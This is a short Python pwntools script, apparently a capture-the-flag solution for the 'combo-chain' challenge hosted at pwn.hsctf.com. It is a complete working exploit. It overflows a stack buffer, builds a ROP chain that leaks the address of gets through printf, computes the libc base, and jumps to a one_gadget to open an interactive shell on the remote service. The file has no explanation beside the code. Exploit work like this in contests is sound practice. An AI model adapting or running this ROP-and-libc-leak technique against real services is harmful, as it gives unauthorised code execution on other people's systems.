#!/usr/bin/python
from pwn import *

# context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

HOST = 'pwn.hsctf.com'
PORT = 2345
conn = remote(HOST, PORT)
# conn = process('./combo-chain')

libc = ELF('./libc6_2.23-0ubuntu11_amd64.so')
e = ELF("./combo-chain")

def rdi(a) :
    p = str()
    p += p64(0x0000000000401263)
    p += p64(a)

    return p

printf_got = e.got['printf']
gets_got = e.got['gets']
printf_plt = e.plt['printf']
main_addr = e.symbols['main']
nop_addr = 0x000000000040114f

p = str()
p += 'A' * 16
p += rdi(gets_got)
p += p64(nop_addr)
p += p64(printf_plt)
p += p64(0x00004011E9)
p += '\n'

# gdb.attach(
#     conn,
#     '''
#     b *0x4011A3
#     '''
# )
# raw_input()

conn.sendafter(": ", p)
libc_base = u64(conn.recv(6) + '\x00' * 2) - 0x06ed80
print(hex(libc_base))

p = 'A' * 16
p += p64(libc_base + 0xf1147)
p += '\n'

conn.sendafter(": ", p)

conn.interactive()